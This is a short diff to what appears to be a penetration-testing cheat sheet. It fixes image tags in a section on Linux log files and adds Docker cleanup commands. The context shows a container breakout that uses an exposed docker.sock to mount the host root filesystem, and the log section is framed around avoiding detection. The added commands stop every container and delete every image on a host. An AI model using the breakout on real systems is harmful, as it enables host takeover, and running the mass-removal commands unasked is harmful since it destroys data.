@@ -777,14 +777,14 @@ During a pentesting engagement, you will want to try to avoid detection from the
 On Debian and Ubuntu, the majority of these are left within the "/var/log directory and often require administrative privileges to read and modify. Some log files of interest:
 
     "/var/log/auth.log" (Attempted logins for SSH, changes too or logging in as system users:)
-<img src="https://imgur.com/37aTxnI.png/>
+<img src="https://imgur.com/37aTxnI.png"/>
           
     "/var/log/syslog" (System events such as firewall alerts:)
-<img src="https://imgur.com/k7scyUP.png/>    
+<img src="https://imgur.com/k7scyUP.png"/>    
     "/var/log/<service/"
     For example, the access logs of apache2
         /var/log/apache2/access.log
-<img src="https://imgur.com/y8Rin3h.png/>
+<img src="https://imgur.com/y8Rin3h.png"/>
           
 # Docker
 To see list of conatiner/images on a remote machine <br/>
@@ -800,6 +800,13 @@ Break out of docker container<br/>
 If docker.sock is on conatiner , upload static docker binary<br/>
 `./docker -H unix:///var/run/docker.sock images`<br/>
 `./docker -H unix:///var/run/docker.sock run -it -v /:/host/ wordpress chroot /host`<br/>
+
+Remove docker images 
+`docker rmi $(docker images -q)` <br/>
+
+Remove docker containers
+
+`docker stop $(docker ps -a)`<br/>
 
 ## Docker Breakout/Exploits
 
